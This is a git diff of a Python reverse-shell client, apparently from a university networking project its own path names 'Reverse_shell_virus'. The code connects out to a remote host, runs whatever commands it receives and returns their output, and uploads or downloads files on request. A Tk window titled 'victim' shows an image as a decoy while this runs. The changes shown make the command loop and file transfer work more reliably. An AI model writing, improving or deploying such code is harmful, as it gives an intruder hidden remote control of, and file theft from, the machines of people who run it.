@@ -50,7 +50,7 @@ def uploading_a_file(_request:str):
 def downloading_a_file(_request:str):
     words=_request.split()
     print(words[1])
-    final_name_manipulating=words[1].split("\\")
+    final_name_manipulating=words[1].split("/")
     final_name=final_name_manipulating[-1]
     file=open(words[1],"rb")
     print('client_'+final_name)
@@ -58,6 +58,7 @@ def downloading_a_file(_request:str):
     client.send(name.encode())
     time.sleep(1)
     data=file.read()
+    print(data)
     client.sendall(data)
     print("data sent")
     client.send(b"<END>")
@@ -75,17 +76,18 @@ def background():
     client.connect((HOST,PORT))
     print("connectd sucssefully!!")
     while True:
-        request=client.recv(1024).decode('UTF-8')
+        request=client.recv(1024).decode()
         print(request)
         if 'sendall' in request:
             sending_all(request)
-        if 'download' in request:
+        elif 'download' in request:
             downloading_a_file(request)
-        if 'upload' in request:
+        elif 'upload' in request:
             uploading_a_file(request)
         else:
             output=run_command(request)
-            client.sendall(output.encode('UTF-8'))
+            client.sendall(output.encode())
+
 
         
 
@@ -93,7 +95,7 @@ def front():
     root=tk.Tk()
     root.title("victim")
     root.geometry("1000x450")
-    photo=tk.PhotoImage(file="photo.png")
+    photo=tk.PhotoImage(file="/home/saman/Documents/GitHub/IUT/Network/Reverse_shell_virus/photo.png")
     label=tk.Label(root,image=photo,width=1000,height=450,bg="black",fg="yellow")
     label.pack()
     root.mainloop()
